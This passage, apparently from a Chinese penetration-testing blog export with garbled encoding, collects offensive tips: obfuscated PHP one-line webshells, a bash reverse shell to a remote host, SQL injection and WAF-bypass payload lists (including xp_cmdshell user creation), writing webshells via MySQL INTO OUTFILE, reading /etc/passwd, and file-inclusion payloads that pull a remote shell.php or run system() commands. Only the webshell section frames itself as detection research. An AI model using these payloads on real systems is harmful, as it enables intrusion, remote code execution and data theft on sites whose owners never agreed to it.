$zk(&quot;p&quot;,&quot;&quot;,&quot;pcprpepaptpe_fpupnpcptpipopn&quot;);//è°ƒç”¨$zk å­—ç¬¦ä¸²æ›¿æ¢ï¼šæ›¿æ¢pcprpepaptpe_fpupnpcptpipopné‡Œçš„zä¸ºç©º å¾—åˆ°create_functionåˆ›å»ºåŒ¿åå‡½æ•°$zvm = $dva(&apos;&apos;, $ef($zk(&quot;le&quot;, &quot;&quot;, $ojj.$mt.$hsa.$fnx)));//åˆ†è§£æ­¥éª¤//$zvm=create_function(base64_decode(str_replace(&quot;le&quot;,&quot;&quot;,&quot;IEBleldlemFsKCleRfUE9TVFsnd2VuJ10pOw==&quot;))) //æ‹¼æ¥åçš„è¯­å¥//$zvm=create_function(base64_decode(IEBldmFsKCRfUE9TVFsnd2VuJ10pOw==))) //æ‰§è¡Œå®Œstr_replaceå‡½æ•°åï¼Œè¿”å›base64åŠ å¯†åçš„å­—ç¬¦ä¸²//$zvm=create_function(@eval($_POST[&apos;wen&apos;])); //æ‰§è¡Œå®Œbase64_decode å¾—åˆ°è§£å¯†åçš„å­—ç¬¦ä¸² å¾—åˆ°ä¸€å¥è¯æœ¨é©¬ å¯†ç æ˜¯wen$zvm(); //æ‰§è¡Œ?&gt; ç¬¬äºŒä¸ªï¼š12345678910111213&lt;?php$uf=&quot;snd2Fqd&quot;;$ka=&quot;IEBldmFsK&quot;;$pjt=&quot;CRfUE9TVF&quot;;$vbl = str_replace(&quot;ti&quot;,&quot;&quot;,&quot;tistittirti_rtietipltiatice&quot;); //ç©ºæ ¼æ›¿æ¢ti str_replace$iqw=&quot;WVqaSddKTs=&quot;;$bkf = $vbl(&quot;k&quot;, &quot;&quot;, &quot;kbakske6k4k_kdkekckokdke&quot;); //ç©ºæ ¼æ›¿æ¢k base64_decode ï¼ˆbase64åŠ å¯†ï¼‰$sbp = $vbl(&quot;ctw&quot;,&quot;&quot;,&quot;ctwcctwrectwatctwectw_fctwuncctwtctwioctwn&quot;); //ç©ºæ ¼æ›¿æ¢ctw create_function$mpy = $sbp(&apos;&apos;, $bkf($vbl(&quot;b&quot;, &quot;&quot;, $ka.$pjt.$uf.$iqw)));//$mpy =create_function(&apos;&apos;, base64_decode(str_replace(&quot;b&quot;, &quot;&quot;,&apos;IEBldmFsKCRfUE9TVFsnd2FqdWVqaSddKTs=&apos;)))//$mpy= @eval($_POST[&apos;wajueji&apos;]);$mpy();?&gt; ç°åœ¨çš„webshellå¤§éƒ¨åˆ†éƒ½æ˜¯å›è°ƒå‡½æ•°ï¼ŒåŒ¿åå‡½æ•°ï¼ŒåŠä¸€äº›PHPçš„ç‰¹æ®Šçš„å‡½æ•°ï¼Œæˆ–è€…æ˜¯PHPçš„ç‰¹æ€§ã€‚æ„é€ å‡ºæ— ç‰¹å¾çš„webshellï¼Œä¼ ç»Ÿçš„åŸºäºæ­£åˆ™çš„webshellæŸ¥æ€å¯¹äºè¿™äº›webshellæ˜¯æ— æ³•æŸ¥å‡ºçš„ï¼Œæ ¹æ®åœ¨Dç›¾ä¸­çš„æµ‹è¯•ï¼Œå°±ç®—æŠ¥å‡ºï¼Œä¹Ÿæ˜¯çº§åˆ«ä¸º1ï¼Œ2çš„ä½çº§çš„ï¼ŒåŸºæœ¬ä¸Šå’±ä»¬å°±å¿½ç•¥äº†ã€‚ å’±ä»¬éƒ½çŸ¥é“ä¼ ç»Ÿçš„webshellæŸ¥æ€åŸºæœ¬ä¸Šéƒ½æ˜¯åŸºäºæ­£åˆ™åº“(è¿™é‡Œä¸å¾—ä¸åæ§½ä¸‹å…¬å¸çš„é‚£ä¸ªwebshellæŸ¥æ€å·¥å…·ï¼ŒçœŸå‡ æŠŠåƒåœ¾çš„ä¸è¡Œ)ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è‡ªå·±å°±èƒ½æ–­å®šæŸä¸ªPHPè„šæœ¬æ˜¯æ˜¯webshellå‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬åœ¨è‡ªå·±çš„å¤§è„‘ä¸­è™šæ‹Ÿè°ƒè¯•äº†è¿™ä¸ªPHPè„šæœ¬ï¼ŒçŸ¥é“å®ƒæ˜¯å¹²å˜›çš„äº†ï¼Œæ‰€ä»¥è¿™å°±æ˜¯å’Œå·¥å…·çš„åŒºåˆ«ï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—å¼€å‘çš„webshellæŸ¥æ€å°±æ˜¯åŸºäºè™šæ‹Ÿæ‰§è¡Œå’Œæ­£åˆ™çš„webshellæŸ¥æ€ã€‚ æ¯”å¦‚æˆ‘ä»¬é‚£ä¸Šé¢çš„ç¬¬ä¸€ä¸ªåˆ—å­ï¼šå¦‚æœæˆ‘ä»¬echo $zk,$ef,$dva,$zvmåˆ™ç»“æœä¸ºï¼šstr_replace,base64_decode,create_function,create_function(@eval($_POST[&#39;wen&#39;]))è¿™æ ·åœ¨åŸºäºæ­£åˆ™åŒ¹é…ä¹‹åæ˜¯ä¸æ˜¯å°±å¾ˆæ˜æ˜¾äº†ã€‚ å†æ¥çœ‹å‡ ä¸ªä¾‹å­ï¼š12&lt;?php$sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&apos;n985de9&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 12&lt;?php$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt; æŒ‰ç…§è¿™ä¸ªæ€è·¯æ˜¯ä¸æ˜¯å¾ˆå®¹æ˜“æ£€æµ‹äº†ã€‚å†æ¥çœ‹ä¸€ä¸ªï¼š123456&lt;?php$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;); // $_=&apos;assert&apos;;$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;$___=$$__;$_($___[_]); // assert($_POST[_]);?&gt; æ‰€ä»¥ç°åœ¨è¦åšçš„å°±æ˜¯æ‰¾å‡ºè„šæœ¬ä¸­æ‰€æœ‰çš„å˜é‡åŠåŒ¿åå‡½æ•°å³å¯ã€‚]]></content>
      <tags>
        <tag>è¿ç»´</tag>
        <tag>CTF</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…³äº'ä¸‡èƒ½å¯†ç 'çš„æ€è€ƒ]]></title>
    <url>%2F2017%2F04%2F25%2F%E5%85%B3%E4%BA%8E%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%9A%84%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘åœ¨æ€»ç»“çš„æ—¶å€™ï¼Œå…³äºSQLä¸‡èƒ½å¯†ç æ–¹é¢çš„ä¸€äº›æ€è€ƒã€‚SQLä¸‡èƒ½å¯†ç ï¼Œæƒ³å¿…å¤§å®¶éƒ½çŸ¥é“ï¼Œæ¯”å¦‚åƒç±»ä¼¼çš„admin&#39; or &#39;1&#39;=&#39;1&#39;--è¿™æ ·çš„ä»£ç ï¼Œå°±æ˜¯è®©SQLçš„è¡¨è¾¾å¼è¿”å›trueã€‚ ä»è€Œè¾¾åˆ°é€»è¾‘æ­£ç¡®ã€‚ æˆ‘ä»¬å¸¸ç”¨çš„æ³¨é‡Šç¬¦æœ‰ï¼š%00,%80-%99---- +#ç­‰å¦‚æœè¿‡æ»¤äº†or,--,#ç­‰ç‰¹æ®Šå­—ç¬¦çš„è¯ï¼Œæˆ‘ä»¬çš„å¸¸ç”¨çš„ä¸‡èƒ½å¯†ç å°±ä¸èƒ½ä½¿ç”¨äº†ï¼Œæ ¹æ®ä¹‹å‰åšå‘½ä»¤æ‰§è¡Œç»•è¿‡çš„ç»éªŒï¼Œä½¿ç”¨payloadï¼š&#39;||&#39; å’Œä¸‡èƒ½å¯†é’¥ä¸€æ ·ï¼Œå…ˆé—­åˆå‰é¢çš„è¯­å¥ï¼Œåé¢çš„&#39;ä¸åŸè¯­å¥é—­åˆå¾—åˆ°ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬çŸ¥é“å­—ç¬¦ä¸²è‚¯å®šæ˜¯é0çš„ï¼Œç„¶åå†||æˆ–è¿ç®—ç¬¦è¿ç®—åï¼Œå¾—åˆ°çš„æ°¸è¿œæ˜¯trueã€‚]]></content>
      <tags>
        <tag>çˆ†ç ´</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>WAFç»•è¿‡</tag>
        <tag>SQLæ³¨å…¥</tag>
        <tag>ä¸‡èƒ½å¯†ç </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€æµ‹è¯•ä¹‹åå¼¹shellå‘½ä»¤åˆ†æ]]></title>
    <url>%2F2017%2F04%2F12%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[æˆ‘ä»¬åœ¨å¯¹linuxä¸»æœºè¿›è¡Œæ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œç»å¸¸å›ç”¨åˆ°åå¼¹shell,ä¹‹å‰ä¹Ÿæ²¡å¥½å¥½å»ç ”ç©¶ã€ç†è§£å…·ä½“éƒ½æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå°±åªçŸ¥é“ä¼šç”¨â€¦(so lowâ€¦-.-)æœ€åŸºæœ¬çš„åå¼¹shellçš„ä»£ç å¦‚ä¸‹ï¼š bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1 å’±ä»¬ä¸€æ­¥ä¸€æ­¥æ¥åˆ†æï¼š Step 1bash -i è¿™ä¸ªå¤§å®¶éƒ½çŸ¥é“å°±æ˜¯æ‰“å¼€ä¸€ä¸ªäº¤äº’å¼çš„bash Step 2/dev/tcp è¿™ä¸ªæ˜¯linuxä¸­ä¸€ä¸ªç‰¹æ®Šçš„è®¾å¤‡ï¼Œæ‰“å¼€è¿™ä¸ªæ–‡ä»¶å°±ç›¸å½“äºå»ºç«‹äº†ä¸€ä¸ªsocketè¿æ¥ï¼Œå¯¹è¿™ä¸ªæ–‡ä»¶çš„è¯»å†™å°±ç›¸å½“äºåœ¨è¿™ä¸ªsocketè¿æ¥ä¸­ä¼ è¾“æ•°æ®ã€‚linuxä¸­è¿˜æœ‰å’Œå®ƒä¸€æ ·çš„æ–‡ä»¶/dev/udpã€‚ Step 3/192.168.1.1/8080 è¿™ä¸ªæ˜¯è¡¨ç¤ºè¿œç¨‹ä¸»æœºåŠç›‘å¬çš„ç«¯å£ã€‚ Step 40&gt;&amp;1 é¦–å…ˆç§‘æ™®ä¸‹linux shellä¸‹å¸¸ç”¨çš„æ–‡ä»¶æè¿°ç¬¦ï¼š æ ‡å‡†è¾“å…¥(stdin): ä»£ç ä¸ºâ€™0â€™,ä½¿ç”¨ &lt; æˆ– &lt;&lt; æ ‡å‡†è¾“å‡º(stdout): ä»£ç ä¸ºâ€™1â€™,ä½¿ç”¨ &gt; æˆ– &gt;&gt; æ ‡å‡†é”™è¯¯è¾“å‡º(stderr): ä»£ç ä¸ºâ€™2â€™,ä½¿ç”¨ 2&gt; æˆ– 2&gt;&gt; ç»è¿‡æŸ¥æ‰¾å‘ç°ï¼š&gt;&amp;å’Œ&amp;&gt;çš„ä½œç”¨æ˜¯ä¸€æ ·çš„ï¼Œå³ï¼š 0&gt;&amp;1å’Œ0&lt;&amp;1æ˜¯ä¸€ä¸ªæ„æ€ï¼Œéƒ½æ˜¯å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºä¸­ã€‚ Step 5OVER!å¥½å¥‡å¿ƒçœŸçš„å¾ˆæœ‰ç”¨å•Š! )_(]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQLå†™shellçš„ä¸€äº›tips]]></title>
    <url>%2F2017%2F04%2F01%2FMySQL%E5%BE%97%E5%88%B0%E8%B7%AF%E5%BE%84%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[é€šè¿‡æ³¨å…¥å†™shellï¼Œé¦–å…ˆéœ€è¦æ‰¾åˆ°ç½‘ç«™çš„ç»å¯¹è·¯å¾„ã€‚ ä¸€ã€æ‰¾è·¯å¾„1.æŠ¥é”™tipsï¼šæœ‰æ—¶å€™information_schema.tablesä¸èƒ½ç”¨æ—¶ï¼Œåœ¨MySQL 5.6åŠä»¥ä¸Šç‰ˆæœ¬ä¸­å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¡¨12?id=1&apos; union select 1,group_concat(table_name) from mysql.innodb_table_stats where database_name=schema()%23&amp;Submit=Submit%23?id=1&apos; union select 1,group_concat(table_name) from mysql.innodb_index_stats where database_name=schema()%23&amp;Submit=Submit%23 2.phpinfo3.load_file1SELECT LOAD_FILE(&apos;/etc/apache2/sites-available/default&apos;); tipsï¼šæœ‰æ—¶å€™è¿‡æ»¤äº†æ•æ„Ÿè·¯å¾„å¯ä»¥è¯•è¯•è¿™æ ·ï¼š1SELECT LOAD_FILE(&apos;/etc/sb/../passwd&apos;); 4.æ•°ç»„1user[]=1&amp;passwd[]=1 5.é€šè¿‡mysqlå‡½æ•° æŸ¥æ‰¾mysqlå®‰è£…ç›®å½•1show variables like &apos;datadir&apos;; äºŒã€å†™shell1.è·å–mysql.userå’Œæ–‡ä»¶æƒé™12select group_concat(user,0x3a,file_priv) from mysql.user;å‡ºç°Yï¼Œè¿™å°±ä»£è¡¨ä½ æœ‰æ–‡ä»¶æƒé™ï¼ŒNå°±æ˜¯æ²¡æœ‰ 2.å†™shell123select&apos;&lt;?php @eval($_POST[-77]);?&gt;&apos;INTO OUTFILE &apos;E:\Web\errors.php&apos;å¦‚æœä¸æˆåŠŸï¼Œå¯èƒ½è½¬ä¹‰äº†ã€‚select&apos;&lt;?php @eval($_POST[-77]);?&gt;&apos;INTO OUTFILE &apos;E:\\Web\\errors.php&apos; æœ€å¥½è¿˜æ˜¯æŠŠå†…å®¹ç¼–ç ä¸‹ã€‚]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>webshell</tag>
        <tag>MySQL</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLæ³¨å…¥-ç»•è¿‡]]></title>
    <url>%2F2017%2F03%2F21%2FSQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[æ•´ç†ä¸‹å…³äºSQLæ³¨å…¥ç»•è¿‡çš„ä¸€äº›å§¿åŠ¿ã€‚æ¬¢è¿å¤§ç‰›è¡¥å…… !^â€”^! 0x01 ç»•è¿‡wafæ€è·¯ä»ç¬¬ä¸€æ­¥èµ·ï¼Œä¸€ç‚¹ä¸€ç‚¹å»åˆ†æï¼Œç„¶åç»•è¿‡ã€‚ è¿‡æ»¤ and,or 123preg_match(&apos;/(and|or)/i&apos;, $id)Filtered injection: 1 or 1 = 1 1 and 1 = 1Bypassed injection: 1 || 1 = 1 1 &amp;&amp; 1 = 1 è¿‡æ»¤ and, or, union 123preg_match(&apos;/(and|or|union)/i&apos;, $id)Filtered injection: union select user, password from usersBypassed injection: 1 || (select user from users where user_id = 1) = &apos;admin&apos; è¿‡æ»¤ and, or, union, where 123preg_match(&apos;/(and|or|union|where)/i&apos;, $id)Filtered injection: 1 || (select user from users where user_id = 1) = &apos;admin&apos;Bypassed injection: 1 || (select user from users limit 1) = &apos;admin&apos; è¿‡æ»¤ and, or, union, where, limit 123preg_match(&apos;/(and|or|union|where|limit)/i&apos;, $id)Filtered injection: 1 || (select user from users limit 1) = &apos;admin&apos;Bypassed injection: 1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos; è¿‡æ»¤ and, or, union, where, limit, group by 123preg_match(&apos;/(and|or|union|where|limit|group by)/i&apos;, $id)Filtered injection: 1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos;Bypassed injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users ) = 1 è¿‡æ»¤ and, or, union, where, limit, group by, select 1234preg_match(&apos;/(and|or|union|where|limit|group by|select)/i&apos;, $id)Filtered injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1Bypassed injection: 1 || 1 = 1 into outfile &apos;result.txt&apos;Bypassed injection: 1 || substr(user,1,1) = &apos;a&apos; è¿‡æ»¤ and, or, union, where, limit, group by, select, â€˜ 12345preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;)/i&apos;, $id)Filtered injection: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1Bypassed injection: 1 || user_id is not nullBypassed injection: 1 || substr(user,1,1) = 0x61Bypassed injection: 1 || substr(user,1,1) = unhex(61) è¿‡æ»¤ and, or, union, where, limit, group by, select, â€˜, hex 123preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex)/i&apos;, $id)Filtered injection: 1 || substr(user,1,1) = unhex(61)Bypassed injection: 1 || substr(user,1,1) = lower(conv(11,10,36)) è¿‡æ»¤ and, or, union, where, limit, group by, select, â€˜, hex, substr 123preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr)/i&apos;, $id)Filtered injection: 1 || substr(user,1,1) = lower(conv(11,10,36))Bypassed injection: 1 || lpad(user,7,1) è¿‡æ»¤ and, or, union, where, limit, group by, select, â€˜, hex, substr, ç©ºæ ¼ 123preg_match(&apos;/(and|or|union|where|limit|group by|select|\&apos;|hex|substr|\s)/i&apos;, $id)Filtered injection: 1 || lpad(user,7,1)ypassed injection: 1%0b||%0blpad(user,7,1) 0x02 æ­£åˆ™ç»•è¿‡æ ¹æ®æ­£åˆ™çš„çš„æ¨¡ç³ŠåŒ¹é…ç‰¹æ€§ç»•è¿‡ï¼Œæ¯”å¦‚è¿‡æ»¤äº†â€™=â€™filtered injection: 1 or 1 = 1Bypassed injection: 1 or 1,1 or â€˜1â€™,1 or char(97)123456eg:filtered injection: 1 union select 1, table_name from information_schema.tables where table_name = &apos;users&apos;Bypassed injection: 1 union select 1, table_name from information_schema.tables where table_name between &apos;a&apos; and &apos;z&apos;Bypassed injection: 1 union select 1, table_name from information_schema.tables where table_name between char(97) and char(122)Bypassed injection: 1 union select 1, table_name from information_schema.tables where table_name between 0x61 and 0x7aBypassed Injection: 1 union select 1, table_name from information_schema.tables where table_name like 0x7573657273 0x03 é€šç”¨ç»•è¿‡1.æ³¨é‡Šç¬¦ ?id=1+un//ion+se//lect+1,2,3â€“ 2.å¤§å°å†™ ?id=1+UnIoN//SeLecT//1,2,3â€“ 3.å…³é”®å­—æ›¿æ¢æœ‰äº›wafç­‰ä½¿ç”¨preg_replaceæ›¿æ¢äº†SQLå…³é”®å­—12?id=1+UNunionION+SEselectLECT+1,2,3--?id=1+uni%0bon+se%0blect+1,2,3-- æœ‰æ—¶å€™æ³¨é‡Šç¬¦â€™/**/â€˜å¯èƒ½è¢«è¿‡æ»¤ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨%0bç»•è¿‡12Forbidden: http://localhost/id/1/**/||/**/lpad(first_name,7,1).htmlBypassed : http://localhost/id/1%0b||%0blpad(first_name,7,1).html 4.ç¼–ç ä¸€ä¸ªç»å…¸çš„è„šæœ¬ï¼šNukesentinel.php123456789101112131415// Check for UNION attack // Copyright 2004(c) Raven PHP Scripts $blocker_row = $blocker_array[1]; if($blocker_row[&apos;activate&apos;] &gt; 0) &#123; if (stristr($nsnst_const[&apos;query_string&apos;],&apos;+union+&apos;) OR \ stristr($nsnst_const[&apos;query_string&apos;],&apos;%20union%20&apos;) OR \ stristr($nsnst_const[&apos;query_string&apos;],&apos;*/union/*&apos;) OR \ stristr($nsnst_const[&apos;query_string&apos;],&apos; union &apos;) OR \ stristr($nsnst_const[&apos;query_string_base64&apos;],&apos;+union+&apos;) OR \ stristr($nsnst_const[&apos;query_string_base64&apos;],&apos;%20union%20&apos;) OR \ stristr($nsnst_const[&apos;query_string_base64&apos;],&apos;*/union/*&apos;) OR \ stristr($nsnst_const[&apos;query_string_base64&apos;],&apos; union &apos;)) &#123; // block_ip($blocker_row); die(&quot;BLOCK IP 1 &quot; ); &#125; &#125; 123Forbidden: http://localhost/php/?/**/union/**/selectBypassed : http://localhost/php/?/%2A%2A/union/%2A%2A/selectBypassed : http://localhost/php/?%2f**%2funion%2f**%2fselect 5.ç¼“å†²åŒºæº¢å‡º http://localhost/news.php?id=1+and+(select 1)=(select 0xA*1000)+union+select+1,2,version(),database(),user(),6,7,8,9,10â€“ 6.å†…è”æ³¨é‡Š(mysql)12http://localhost/news.php?id=1/*!UnIoN*/SeLecT+1,2,3--http://localhost/news.php?id=/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()-- 0x04 é«˜çº§ç»•è¿‡1.HPPï¼ˆhttpå‚æ•°æ±¡æŸ“)ä¸¾ä¸ªä¾‹å­ï¼šindex.php?par1=val1&amp;par1=val2| web server | par1 || :â€” | :â€” || ASP.NET/IIS | val1,val2 || ASP/IIS | val1,val2 || PHP/Apache | val2 || JSP/Tomcat | val1 |eg:åœ¨ASP/ASP.NETçš„ç¯å¢ƒä¸‹1234Forbidden: http://localhost/search.aspx?q=select name,password from usersBypassed : http://localhost/search.aspx?q=select name&amp;q=password from usersBypassed : http://localhost/search.aspx?q=select/*&amp;q=*/name&amp;q=password/*&amp;q=*/from/*&amp;q=*/usersBypassed : http://localhost/news.aspx?id=1&apos;; /*&amp;id=1*/ EXEC /*&amp;id=1*/ master..xp_cmdshell /*&amp;id=1*/ net user test test /*&amp;id=1*/ -- 2.HPC(httpå‚æ•°æ±¡æŸ“)RFC2396å®šä¹‰äº†å¦‚ä¸‹ä¸€äº›å­—ç¬¦ï¼š123Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * &apos; ()Reserved : ; / ? : @ &amp; = + $ ,Unwise : &#123; &#125; | \ ^ [ ] ` ä¸åŒçš„WebæœåŠ¡å™¨å¤„ç†å¤„ç†æ„é€ å¾—ç‰¹æ®Šè¯·æ±‚æ—¶æœ‰ä¸åŒçš„é€»è¾‘ï¼š| Query String | Apache/2.2.16,PHP/5.3.3 | IIS6/ASP || :â€” | :â€” | :â€” || ?test[1=2 | test_1=2 | test[1=2 || ?test=% | test=% | test= || ?test%00=1 | test= | test=1 || ?test=1%001 | NULL | test=1 || ?test+d=1+2 | test_d=1 2 | test d=1 2 |eg:123456Forbidden: http://localhost/?xp_cmdshellBypassed : http://localhost/?xp[cmdshellForbidden: http://localhost/test.asp?file=../flag.txtBypassed : http://localhost/test.asp?file=.%./flag.txtForbidden: http://localhost/news.asp?id=10 and 1=0/(select top 1 table_name from information_schema.tables)Bypassed : http://localhost/news.asp?id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)]]></content>
      <tags>
        <tag>WAFç»•è¿‡</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ–‡ä»¶åŒ…å«-Tips]]></title>
    <url>%2F2017%2F03%2F21%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-Tips%2F</url>
    <content type="text"><![CDATA[å­¦æ ¡è¦æä¸ªè¯‘æ–‡(çœŸç‰¹ä¹ˆä¸æ˜ç™½æœ‰ä»€ä¹ˆåµç”¨â€¦)ï¼Œç„¶åå°±æ‰¾äº†å‡ ç¯‡å¤–å›½æ¯”è¾ƒå¥½çš„æ–‡ç« ï¼Œè¶ç€ä¹Ÿæ¶¨ç‚¹å§¿åŠ¿ã€‚ åŸºæœ¬çš„æ–‡ä»¶åŒ…å«æ”»å‡»ä¸å¤šè¯´ï¼Œéƒ½æ‡‚ http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into 192.168.1.11/bWAPP/flfi.php?language=http://192.168.1.11/shell.php æ‰©å±•çš„æ–‡ä»¶åŒ…å«æ”»å‡»åŠ äº†ä¸ª?ä¸æ˜¯å¾ˆæ˜ç™½æ˜¯ä»€ä¹ˆåŸå› ï¼Œæˆ‘è§‰å¾—æ˜¯æˆªæ–­ã€‚ http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into192.168.1.11/bWAPP/flfi.php? language=http://192.168.1.11/shell.php? ç©ºå­—èŠ‚æˆªæ–­%00éƒ½æ˜¯è€å¥—è·¯ http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into 192.168.1.11/bWAPP/flfi.php?language=http://192.168.1.11/shell.php%00 æ›´æ”¹HTTP http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into192.168.1.11/bWAPP/flfi.phï¼Ÿlanguage = HTTPï¼š//192.168.1.11/shell.php æ›´æ”¹å›¾åƒæ‰©å±•åä¸çŸ¥é“è€å¤–ä¸ºå•¥è¿™æ ·è¯´ï¼Œæˆ‘è§‰å¾—æ˜¯æ–‡ä»¶ä¼ªè£…å•Š ä¿®æ”¹æ–‡ä»¶å†…å®¹ï¼Œåœ¨æ–‡ä»¶å¤´æ·»åŠ GIF89aï¼Œç„¶åä¿®æ”¹æ–‡ä»¶åç¼€ä¸ºshell.gif http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into192.168.1.11/bWAPP/flfi.ph?language=httpï¼š//192.168.1.11/shell.gif é»‘åå•æ”»å‡»ä¿®æ”¹å¤§å°å†™å•¦ï¼Œä¿®æ”¹åç¼€å•¦ï¼Œè§£ææ¼æ´å•¦ï¼Œæ¯”å¦‚.PHP,.php3,.asa,.cerè¿™äº›å•¦ç­‰ç­‰ã€‚ http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into192.168.1.11/bWAPP/flfi.php?language=http://192.168.1.11/shell.PHP Base64ç¼–ç  http://192.168.1.113/bWAPP/rlfi.php?language= php://filter/read=convert.base64-encode-resource=http://192.168.1.11/shell.php æåˆ°æœ€åè€å¤–è‡ªå·±è¿˜æ¥ä¸ªå‰å®³äº†ï¼ï¼ï¼,æŠŠæˆ‘å½“æ—¶æ•´è’™è”½äº†ã€‚ã€‚ PHP inputè¾“å…¥æµå¥—è·¯â€¦123http://192.168.1.101/bWAPP/rlfi.php?language=php://input&amp;cmd=lsPOST:&lt;?php system($_GET[&apos;cmd&apos;]);?&gt; Proc/self/environè¿™ä¸ªæœ‰å¾ˆå¤šç§çš„ï¼Œä¸é™äºè¿™ä¸ªæ—¥å¿—ï¼Œæ¯”å¦‚access.log,error_logç­‰å„ç§æ—¥å¿—æ–‡ä»¶ã€‚ é€šè¿‡åŒ…å«User-Agentçš„proc/self/environæ–‡ä»¶æ¥åˆ©ç”¨12User-Agent: &lt;?php system($_GET[&apos;cmd&apos;]);?&gt;http://192.168.1.102/dvwa/vulnerabilities/fi/?page=proc/self/environ&amp;cmd=id PHPæ–‡ä»¶åŒ…å«è‡ªå·±çš„å°æ¦‚è¿° åŸºæœ¬çš„æœ¬åœ°æ–‡ä»¶åŒ…å«&lt;?php include(â€œinc/â€ .$_GET[â€˜fileâ€™]);?&gt;åŒ…å«æ–‡ä»¶åœ¨å½“å‰ç›®å½•ä¸‹ï¼š?file=.htaccessç›®å½•éå†ï¼šï¼Ÿfile=../../../../../../../../var/lib/locate.dbåŒ…å«æ³¨å…¥çš„PHPä»£ç ï¼šï¼Ÿfile=../../../../../../../var/log/apache/error.logä¸€äº›æŠ€å·§ï¼š å¯èƒ½çš„Apacheç›®å½•åˆ—è¡¨ åŒ…å«è®¿é—®æ—¥å¿—ï¼Œæ¯”å¦‚/proc/self/fd/X åŒ…å«æ¥æ‹¥æœ‰æ›´å¤šä¿¡æ¯çš„procæ–‡ä»¶ç³»ç»Ÿ åŒ…å«ç”µå­é‚®ä»¶çš„æ—¥å¿—æ–‡ä»¶ åŒ…å«sshçš„è®¤è¯æ—¥å¿—æ–‡ä»¶ auth.log å°½å¯èƒ½å¤šçš„å°è¯•å¤´åƒ/å›¾ç‰‡/é™„ä»¶æ–‡ä»¶ä¸Šä¼  åŒ…å«ä¼šè¯æ–‡ä»¶ åŒ…å«PHPçš„ä¸´æ—¶ä¸Šä¼ æ–‡ä»¶ï¼ˆå¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼‰å¦‚æœä½ 